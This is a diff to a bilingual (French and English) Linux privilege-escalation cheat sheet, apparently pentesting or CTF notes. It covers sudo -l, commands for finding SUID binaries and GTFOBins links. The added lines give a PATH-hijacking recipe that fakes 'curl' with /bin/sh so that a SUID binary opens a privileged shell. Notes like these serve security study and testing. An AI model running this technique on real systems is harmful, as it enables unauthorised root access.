@@ -1,5 +1,5 @@
 
-## __Sudo -l__
+# Sudo -l
 
 Grâce à la commande **`sudo -l`**, on peut récuperer les commandes que l'on peut éxecuter en sudo.
 
@@ -38,8 +38,20 @@ To find these file you can do this command:
 ```shell
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
+or more digest
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
 
 This link https://gtfobins.github.io/#+suid show you the executable known to be exploitable with the SUID bit set.
+## Other command
+If you see that the suid command run another command like curl, you can use it to get a shell with his own priviledge:
+```bash
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=.:$PATH
+/usr/bin/<COMMAND>
+```
 ## Base64
 Here for exemple, we have the base64 executable.  
 https://gtfobins.github.io/gtfobins/base64/
